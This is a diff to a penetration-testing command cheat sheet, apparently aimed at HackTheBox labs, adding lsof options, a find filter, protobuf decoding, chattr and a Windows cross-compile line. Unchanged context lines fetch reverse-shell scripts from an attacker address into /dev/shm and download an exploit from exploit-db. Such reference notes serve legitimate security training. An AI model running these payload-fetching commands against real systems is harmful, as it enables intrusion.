@@ -32,7 +32,13 @@ wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 
 #Files used by network processes
-lsof -i #Files uses by networks processes
+lsof #Open files belonging to any process
+lsof -p 3 #Open files used by the process
+lsof -i #Files used by networks processes
+lsof -i 4 #Files used by network IPv4 processes
+lsof -i 6 #Files used by network IPv6 processes
+lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
+lsof +D /lib #Processes using files inside the indicated dir
 lsof -i :80 #Files uses by networks processes
 fuser -nv tcp 80
 
@@ -96,13 +102,20 @@ openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz
 perf stat -x, -e instructions:u "ls"
 
 ##Find trick for HTB, find files from 2018-12-12 to 2018-12-14
-find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -ls 2>/dev/null
+find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null
 
 #Reconfigure timezone
 sudo dpkg-reconfigure tzdata
 
 #Search from wich package is a binary
 apt-file search /usr/bin/file #Needed: apt-get install apt-file
+
+#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
+echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw
+
+#Set not removable bit
+sudo chattr +i file.txt
+sudo chattr -i file.txt #Remove the bit so you can delete it
 ```
 
 ## Bash for Windows
@@ -123,7 +136,8 @@ wget -O exploit.py http://www.exploit-db.com/download/31853
 python pyinstaller.py --onefile exploit.py
 
 #Compile for windows
-i586-mingw32msvc-gcc -o executable useradd.c
+#sudo apt-get install gcc-mingw-w64-i686
+i686-mingw32msvc-gcc -o executable useradd.c
 ```
 
 ## Greps
